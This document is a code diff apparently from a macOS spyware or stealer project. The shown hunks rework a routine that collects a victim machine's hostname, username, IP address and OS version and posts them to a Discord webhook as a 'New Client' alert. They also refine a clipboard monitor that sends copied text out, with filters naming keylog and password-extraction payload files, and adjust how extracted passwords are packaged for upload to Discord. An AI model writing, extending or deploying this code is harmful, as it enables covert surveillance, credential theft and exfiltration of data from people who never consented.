@@ -687,19 +687,29 @@ send_client_notification() {
     local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
     local MAC_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Unknown")
     
-    DISCORD_MSG="**New Client**\n\n"
-    DISCORD_MSG="${DISCORD_MSG}**Hostname:** \`${HOSTNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**PC Username:** \`${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**IP Address:** \`${IP}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**macOS:** \`${MAC_VERSION}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
-    
-    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
+    # Use Discord embed for "New Client" message (clean format like startup)
+    NEW_CLIENT_JSON=$(cat <<EOF
+{
+  "embeds": [{
+    "title": "🆕 New Client",
+    "color": 0x00ff00,
+    "fields": [
+      {"name": "Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
+      {"name": "PC Username", "value": "\`${USERNAME}\`", "inline": true},
+      {"name": "IP Address", "value": "\`${IP}\`", "inline": true},
+      {"name": "macOS", "value": "\`${MAC_VERSION}\`", "inline": true},
+      {"name": "Client ID", "value": "\`pc-${HOSTNAME}-${USERNAME}\`", "inline": true},
+      {"name": "Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
+    ],
+    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
+  }]
+}
+EOF
+)
     
     # Use the webhook from settings
-    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
-        -d "{\"content\": \"$ESCAPED_MSG\"}" \
+    echo "$NEW_CLIENT_JSON" | curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
+        --data-binary @- \
         "$WEBHOOK" >/dev/null 2>&1
 }
 
@@ -813,10 +823,13 @@ setInterval(() => {
             const clipboard = stdout.trim();
             // Only process if clipboard actually changed
             if (clipboard !== lastClipboard && clipboard.length > 0) {
-                // Simple filtering - only block obvious system files
+                // Simple filtering - block system files and JSON payloads
                 const isSystemFile = /^[\/~]/.test(clipboard) || // File paths starting with / or ~
-                                     /file_payload_|discord_payload_|startup_|heartbeat_/i.test(clipboard) || // System temp files
-                                     /\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard); // File extensions
+                                     /file_payload_|discord_payload_|keylog_payload_|password_extract_|startup_|heartbeat_|\.json/i.test(clipboard) || // System temp files
+                                     /\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard) || // File extensions
+                                     /^\s*\{[\s\S]*"embeds"[\s\S]*\}\s*$/i.test(clipboard) || // JSON embed objects
+                                     /^\s*\{[\s\S]*"content"[\s\S]*\}\s*$/i.test(clipboard) || // JSON content objects
+                                     /"title":|"color":|"fields":|"timestamp":/i.test(clipboard); // JSON embed structure
                 
                 // Send if it's not a system file and has content
                 if (!isSystemFile && clipboard.length >= 1 && clipboard.length <= 10000) {
@@ -1715,9 +1728,9 @@ main
                             }]
                         };
                         
-                        // Send to Discord with file attachment
+                        // Send to Discord with file attachment (use embed, not content)
                         const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
-                        const payload = { content: message };
+                        const payload = message; // message is already an embed object
                         
                         try {
                             fs.writeFileSync(payloadFile, JSON.stringify(payload));
